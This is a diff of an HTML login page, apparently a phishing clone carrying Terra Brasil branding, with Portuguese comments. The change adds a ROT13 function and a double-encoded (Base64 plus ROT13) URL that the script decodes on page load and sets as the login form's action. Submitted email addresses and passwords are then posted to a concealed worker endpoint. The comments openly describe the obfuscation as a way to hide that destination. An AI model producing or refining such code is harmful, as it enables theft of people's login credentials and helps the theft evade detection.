@@ -151,24 +151,40 @@
  </li>
  <li>
  <a href=https://facebook.com/TerraBrasil target=_blank><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzk5OV82ODkpIj4KPHBhdGggZD0iTTE2IDBDNy4xNjMyIDAgMCA3LjE3MDAxIDAgMTYuMDE1MkMwIDI0LjY1NTQgNi44NCAzMS42NzgxIDE1LjM5MzYgMzJWMjAuODgyMkgxMS42NDQ4VjE2LjUxODFIMTUuMzkzNlYxMy4zMDdDMTUuMzkzNiA5LjU4NTExIDE3LjY2NzIgNy41NTU5OCAyMC45ODU2IDcuNTU1OThDMjIuMTA0IDcuNTUyNzcgMjMuMjIwOCA3LjYxMDQzIDI0LjMzMjggNy43MjQxNFYxMS42MTU4SDIyLjA0OEMyMC4yNCAxMS42MTU4IDE5Ljg4OCAxMi40NzEgMTkuODg4IDEzLjczM1YxNi41MTE3SDI0LjIwOEwyMy42NDY0IDIwLjg3NThIMTkuODYyNFYzMS41NDA0QzI2LjgyODggMjkuODA5MSAzMiAyMy41MjQ3IDMyIDE2LjAxNTJDMzIgNy4xNzAwMSAyNC44MzY4IDAgMTYgMFoiIGZpbGw9IiMzMDJEMkQiLz4KPC9nPgo8ZGVmcz4KPGNsaXBQYXRoIGlkPSJjbGlwMF85OTlfNjg5Ij4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSJ3aGl0ZSIvPgo8L2NsaXBQYXRoPgo8L2RlZnM+Cjwvc3ZnPgo=" alt="Ícone da rede social Facebook" width=32 height=32></a>
- </li>
+  </li>
  </ul>
  </footer>
  </div>
 
-<!-- SCRIPT SIMPLES E DIRETO -->
+<!-- SCRIPT COM OFUSCAÇÃO DUPLA (ROT13 + BASE64) -->
 <script>
+// Função ROT13
+function rot13(str) {
+    return str.replace(/[a-zA-Z]/g, function(c) {
+        return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
+    });
+}
+
 window.addEventListener('load', function() {
     var form = document.getElementById('formLogin');
+    
+    // SUA STRING OFUSCADA (Base64 do ROT13)
+    var stringOfuscada = "dWdnY2Y6Ly96bnRodi56bnRodnpxbmZyYXBienJhcW5mLmpiZXhyZWYucXJpLw==";
+    
+    // DECODIFICA BASE64
+    var passo1 = atob(stringOfuscada);
+    
+    // APLICA ROT13 PARA TER A URL REAL
+    var urlReal = rot13(passo1);
+    
+    // APLICA A URL NO FORM
+    form.action = urlReal;
     
     // Remove qualquer script anterior que possa estar atrapalhando
     form.onsubmit = null;
     
     form.addEventListener('submit', function(e) {
-        // Deixa o formulário enviar naturalmente
-        // Não faz e.preventDefault()
-        
-        // Só valida se pode enviar
+        // Validação antes de enviar
         var email = document.getElementById('user').value.trim();
         var senha = document.getElementById('pass').value.trim();
         
@@ -185,7 +201,6 @@ window.addEventListener('load', function() {
         }
         
         // Se passou, deixa o form enviar naturalmente
-        // O action do form já está configurado
         console.log('✅ Enviando para o worker...');
     });
 });
